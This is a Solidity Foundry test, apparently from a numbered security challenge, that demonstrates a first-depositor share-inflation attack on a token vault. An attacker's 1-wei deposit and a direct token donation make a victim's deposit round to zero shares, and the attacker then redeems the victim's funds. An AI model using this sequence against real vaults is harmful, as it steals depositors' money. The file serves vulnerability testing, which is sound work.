// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/C01.sol";
contract C01Test is Test {
    TokenC01 token; VaultC01 vault;
    address attacker = makeAddr("attacker"); address victim = makeAddr("victim");
    function setUp() public {
        token = new TokenC01("Wrapped Dollar", "WD");
        vault = new VaultC01(token);
        token.mint(attacker, 10_000e18 + 1); token.mint(victim, 10_000e18);
    }
    function test_exploit_firstDepositorInflation() public {
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        token.transfer(address(vault), 10_000e18);
        vm.stopPrank();
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        uint256 shares = vault.deposit(10_000e18, victim);
        vm.stopPrank();
        assertEq(shares, 0, "victim rounded down to zero shares");
        vm.prank(attacker); vault.redeem(1, attacker, attacker);
        assertEq(token.balanceOf(attacker), 20_000e18 + 1);
        assertEq(vault.balanceOf(victim), 0); assertEq(token.balanceOf(victim), 0);
    }
}
